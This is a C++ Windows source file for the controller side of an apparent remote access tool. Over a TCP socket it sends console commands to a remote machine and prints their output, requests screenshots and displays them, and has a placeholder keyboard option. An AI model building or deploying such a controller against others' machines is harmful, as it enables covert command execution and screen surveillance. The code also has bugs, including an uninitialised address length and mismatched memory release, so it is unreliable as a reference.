#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <cstdio>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <conio.h>

#include "WindowCapture.hpp"

#pragma comment(lib, "Ws2_32.lib")

#define BUFSIZE			1024

#define ESC				27

#define	PORT			8986

#define CAPTURE_WIDTH	1920
#define	CAPTURE_HEIGHT	1080

const char* serverip = "127.0.0.1";
const char* eof = "EOF";

typedef struct BmpData {
	byte* data;
	int size;
}bmpdata;

SOCKET sock;
sockaddr_in serverAddr;



bool	SendCommand(const char* cmd);
void	RecvCommandResult(char* save = NULL);
bool	SendShot();
HDC		RecvShot();
HBITMAP LoadBmp(bmpdata* bmp);
bool checkEOF(const char* str, int size);

int main(void)
{
	WSADATA wsaData;
	WORD wsaVersion;

	wsaVersion = MAKEWORD(2, 2);
	auto result = WSAStartup(wsaVersion, &wsaData);

	if (result < 0) {
		printf("WSAStartup()");
		exit(1);
	}

	memset(&sock, 0, sizeof(SOCKET));
	memset(&serverAddr, 0, sizeof(sockaddr_in));

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		printf("socket()");
		exit(1);
	}


	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(PORT);
	inet_pton(AF_INET, serverip, &serverAddr.sin_addr);

	result = connect(sock, (sockaddr*)&serverAddr, sizeof(sockaddr_in));
	if (result == SOCKET_ERROR)
	{
		printf("connect()");
		exit(1);
	}

	int select = 0;
	char input[BUFSIZE] = { 0, };

	while (1) {
		printf("[SYSTEM] --SELECT-- \n");
		printf("1. console \n");
		printf("2. screenshot \n");
		printf("3. keyboard \n");

		scanf("%d", &select);

		switch (select)
		{
		case 1:
			printf("[SYSTEM] : ");

			while (!fgetc(stdin));

			fgets(input, sizeof(input), stdin);

			if (SendCommand(input)) RecvCommandResult();
			break;

		case 2:
			printf("[SYSTEM] --Screen Shot-- \n");
			if (SendShot()) {
				WindowCapture wnd(CAPTURE_WIDTH, CAPTURE_HEIGHT, RecvShot());
			}
			break;

		case 3:
			printf("[SYSTEM] not\n");
			break;

		case 0:
			printf("[SYSTEM] --Good Bye-- \n");
			return 0;
		default:
			printf("ReSelect \n");
			break;
		}

	}

	return 0;
};

bool SendCommand(const char* cmd)
{
	char prompt[BUFSIZE] = { 0, };
	int size;

	strcpy(prompt, cmd);
	size = strlen(prompt);
	prompt[size] = (char)"\n";


	auto result = sendto(sock, prompt, size, 0, (sockaddr*)&serverAddr, sizeof(serverAddr));
	if (result == -1) {
		printf("SendCommand() \n");
		return false;
	}
	return true;
};

void RecvCommandResult(char* save)
{
	char prompt[BUFSIZE] = { 0, };

	sockaddr_in recvAddr;
	int recvAddrsize;
	char recvip[100] = { 0, };

	auto result = recvfrom(sock, prompt, BUFSIZE, 0, (sockaddr*)&recvAddr, &recvAddrsize);
	if (result == -1) {
		printf("RecvCommandResult() \n");
		return;
	}


	inet_ntop(AF_INET, &recvAddr.sin_addr, recvip, sizeof(recvip));

	printf("[SYSTEM] IP : %s \n", recvip);
	printf("[SYSTEM] --DATA-- \n");

	while (1) {
		if (checkEOF(prompt, strlen(prompt))) break;

		memset(prompt, 0, BUFSIZE);

		result = recvfrom(sock, prompt, BUFSIZE, 0, (sockaddr*)&recvAddr, &recvAddrsize);
		if (result == -1) {
			printf("RecvCommandResult() \n");
			return;
		}

		printf("%s \n", prompt);
	}


	printf("\n\n");

	if (save == NULL) return;
	strcat(save, prompt);
};

bool checkEOF(const char* str, int size)
{
	char check[100] = { 0, };

	int checksz = (size - strlen(eof));
	strcpy(check, &str[checksz]);

	auto result = strcmp(check, eof);
	if (result == 0)
		return true;

	return false;
};

bool SendShot()
{
	char PlzScreenShot[] = "PlzScreenShot";
	int size = strlen(PlzScreenShot);

	auto result = sendto(sock, PlzScreenShot, size, 0, (sockaddr*)&serverAddr, sizeof(sockaddr_in));
	if (result == -1) {
		printf("SendShoot() \n");
		return false;
	}

	return true;
};

HDC RecvShot()
{
	/*int screenShotSize = 0;*/

	sockaddr_in recvAddr;
	int recvAddrsize;

	/*auto result = recvfrom(sock, (char*)&screenShotSize, sizeof(screenShotSize), 0, (sockaddr*)&recvAddr, &recvAddrsize);
	if (result == -1) {
		printf("RecvShot() \n");
		return NULL;
	}*/
	bmpdata bmp;

	auto result = recvfrom(sock, (char*)&bmp.size, sizeof(bmp.size), 0, (sockaddr*)&recvAddr, &recvAddrsize);
	if (result == -1) {
		printf("RecvShot() : recv \n");
		return NULL;
	}

	bmp.data = new byte[bmp.size];
	memset(bmp.data, 0, bmp.size);
	result = recvfrom(sock, (char*)bmp.data, bmp.size, 0, (sockaddr*)&recvAddr, &recvAddrsize);
	//result = recv(sock, (char*)bmp.data, bmp.size, 0);
	if (result == -1) {
		printf("RecvShot() : recv \n");
		return NULL;
	}
	HBITMAP loadbit = LoadBmp(&bmp);

	HDC hdc;
	HDC memdc;
	
	hdc = GetDC(NULL);
	memdc = CreateCompatibleDC(hdc);
	SelectObject(memdc, loadbit);

	return memdc;
 };

HBITMAP LoadBmp(bmpdata* bmp)
{
	HBITMAP loadbitmap, hbitMap;
	HDC hdc;
	BITMAP bitmap;
	BITMAPINFOHEADER bi;
	BITMAPFILEHEADER bf;
	
	hdc = GetDC(NULL);
	int width = GetDeviceCaps(hdc, HORZRES);
	int height = GetDeviceCaps(hdc, VERTRES);

	hbitMap = CreateCompatibleBitmap(hdc, width, height);
	DeleteDC(hdc);

	GetObject(hbitMap, sizeof(BITMAP), &bitmap);

	memset(&bi, 0, sizeof(BITMAPINFOHEADER));
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bitmap.bmWidth;
	bi.biHeight = bitmap.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 24;
	bi.biSizeImage = bmp->size;
	bi.biCompression = BI_RGB;

	memset(&bf, 0, sizeof(BITMAPFILEHEADER));
	bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bf.bfSize = sizeof(BITMAPFILEHEADER);
	bf.bfType = 'MB';

	DWORD written = 0;
	HANDLE fp = CreateFileA("tmp.bmp", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(fp, &bf, sizeof(BITMAPFILEHEADER), &written, NULL);
	WriteFile(fp, &bi, sizeof(BITMAPINFOHEADER), &written, NULL);
	WriteFile(fp, bmp->data, bmp->size, &written, NULL);
	CloseHandle(fp);
	free(bmp->data);

	HINSTANCE hInst;
	hInst = GetModuleHandle(NULL);
	loadbitmap = (HBITMAP)LoadImageA(hInst, "tmp.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
	return loadbitmap;
};